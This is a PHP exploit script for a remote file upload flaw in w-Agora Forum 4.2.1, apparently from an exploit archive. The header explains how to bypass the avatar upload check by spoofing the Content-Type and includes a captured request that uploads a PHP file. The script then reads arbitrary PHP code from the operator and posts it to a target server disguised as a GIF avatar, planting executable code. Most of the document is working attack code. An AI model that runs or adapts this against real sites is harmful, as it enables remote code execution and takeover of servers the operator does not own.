<?php
/*
Title .......................: w-Agora Forum 4.2.1 Remote File Upload Exploit
Site ........................: http://www.w-agora.com/en/download.php
Version .....................:  4.2.1
 
 
Author ......................: Treasure Priyamal
Site ........................: http://treasuresec.com
E-mail ......................: treasure[at]treasuresec.com
 
Discription
===========
w-Agora avatar upload option has content file detect option , but it can be replace with simply editing
POST Request from your browser
 
Here is a dump from Temp-Data I editied while im upload the File. Just simply replacing the Content-Type
you will be able to upload your script
 
 
6:28:18.073[118ms][total 3862ms] Status: 200[OK]
POST http://localhost/w-agora/browse_avatar.php Load Flags[LOAD_DOCUMENT_URI  LOAD_INITIAL_DOCUMENT_URI  ] Content Size[-1] Mime Type[text/html]
   Request Headers:
      Host[localhost]
      User-Agent[Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,/*;q=0.8]
      Accept-Language[en-us,en;q=0.5]
      Accept-Encoding[gzip, deflate]
      Accept-Charset[ISO-8859-1,utf-8;q=0.7,*;q=0.7]
      Keep-Alive[115]
      Connection[keep-alive]
      Referer[http://localhost/w-agora/browse_avatar.php?site=localhost]
      Cookie[wa_lang=en; WAS_localhost_test=LastVisit%3D1306715684%26ThisVisit%3D1306715918%26visited%3D1306672722%2B; WAP_localhost_test=Visits%3D1%26LastVisit%3D1306715684; localhost_test_sort=newest; WAP_localhost_auth=lastVisit%3D1306715682%26uid%3Dtest%26pw%3D098f6bcd4621d373cade4e832627b4f6; localhost_auth=lastVisit%3D1306715998%26uid%3Dtest%26pw%3D098f6bcd4621d373cade4e832627b4f6]
   Post Data:
      POST_DATA[-----------------------------76401208715012
Content-Disposition: form-data; name="site"
 
localhost
-----------------------------76401208715012
Content-Disposition: form-data; name="submitted"
 
true
-----------------------------76401208715012
Content-Disposition: form-data; name="perpage"
 
20
-----------------------------76401208715012
Content-Disposition: form-data; name="first"
 
0
-----------------------------76401208715012
Content-Disposition: form-data; name="avatar"; filename="echo.php"
Content-Type: image/jpeg\
 
<?php phpinfo(); ?>
 
-----------------------------76401208715012
Content-Disposition: form-data; name="submit"
 
Copy file
-----------------------------76401208715012--
]
   Response Headers:
      Date[Mon, 30 May 2011 00:58:18 GMT]
      Server[Apache/2.2.11 (Win32) PHP/5.3.0]
      X-Powered-By[PHP/5.3.0]
      Keep-Alive[timeout=5, max=100]
      Connection[Keep-Alive]
      Transfer-Encoding[chunked]
      Content-Type[text/html]
 
 
 
 
*/
 
if(count($argv) == 5)
{
    echo "\n\n";
    echo "+---------------------------------------------------------------+\r\n";
    echo "|        w-Agora Forum 4.2.1 Remote File Upload Exploit          |\r\n";
    echo "|                   Treasure Security                            |\r\n";
    echo "|                 by Treasure Priyamal                           |\r\n";
    echo "|        Usage: php exploit.php site.com /path/ user pass        |\r\n";
    echo "+---------------------------------------------------------------+\r\n";
    echo "\n";
          
    echo "Code to write in the file (ie. <?php phpinfo(); ?>) :\r\n\n";
    $code     =   trim(fgets(STDIN));
      
    $socket   =   @fsockopen($argv[1], 80, $eno, $estr, 30);
    if(!$socket)
    {
        die("Could not connect to ".$argv[1].". Operation aborted.");
    }
      
    $part1      =   "POST http://192.168.1.101/w-agora/browse_avatar.php?site=localhost HTTP/1.1\r\n";
    $part1     .=   "Host: " . $argv[1] . "\r\n";
    $part1     .=   "User-Agent : Mozilla/5.0 (X11; Linux i686; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\r\n";
    $part1     .=   "Accept : text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n";
    $part1     .=   "Connection: keep-alive\r\n";
    $part1     .=   "Accept-Language : en-us,en;q=0.5\r\n";
    $part1     .=   "Referer :localhost/w-agora/browse_avatar.php?site=localhost\r\n";
    $part1     .=   "Cookie : wa_lang=en\r\n";
 
 
    $part1     .=   "Content-Type : multipart/form-data; boundary=---------------------------14695017222113685839218008876\r\n";
    $part2      =   "-----------------------------14695017222113685839218008876\r\n";
    $part2     .=   "Content-Disposition: form-data; name=\"site\"\r\n";
    $part2     .=   "localhost\r\n";
    $part2     .=   "-----------------------------14695017222113685839218008876\r\n";
    $part2     .=   "Content-Disposition: form-data; name=\"submitted\"\r\n";
    $part2     .=   "true\r\n";
    $part2     .=   "-----------------------------14695017222113685839218008876\r\n";
    $part2     .=   "Content-Disposition: form-data; name=\"perpage\"\r\n";
    $part2     .=   "20\r\n";
    $part2     .=   "-----------------------------14695017222113685839218008876\r\n";
    $part2     .=   "Content-Disposition: form-data; name=\"first\"\r\n";
    $part2     .=   "0\r\n";
    $part2     .=   "-----------------------------14695017222113685839218008876\r\n";
    $part2     .=   "Content-Disposition: form-data; name=\"avatar\"; filename=\"file.php\"\r\n";
    $part2     .=   "Content-Type: image/gif\r\n";  // this is where the magic happens
    $part2     .=   $code."\r\n";
    $part2     .=   "-----------------------------14695017222113685839218008876\r\n";
    $part2     .=   "Content-Disposition: form-data; name=\"Submit\"\r\n";
    $part2     .=   "Copy file\r\n";
    $part2     .=   "-----------------------------14695017222113685839218008876\r\n";
      
    $part1     .=   "Content-Length: " . strlen($part2) . "\r\n\r\n";
    $part1     .=   $part2;
 
 
    fwrite($socket, $part1);
 
  
    echo "check the upload folder";
      
}
else
{
    echo "\n\n";
    echo "+---------------------------------------------------------------+\r\n";
    echo "|        w-Agora Forum 4.2.1 Remote File Upload Exploit         |\r\n";
    echo "|                   Treasure Security                            |\r\n";
    echo "|        by Treasure Priyamal                                    |\r\n";
    echo "+---------------------------------------------------------------+\r\n";
    echo "|        Usage: php exploit.php site.com /path/ user pass       |\r\n";
    echo "+---------------------------------------------------------------+\r\n";
    echo "\n\n";
}
?>
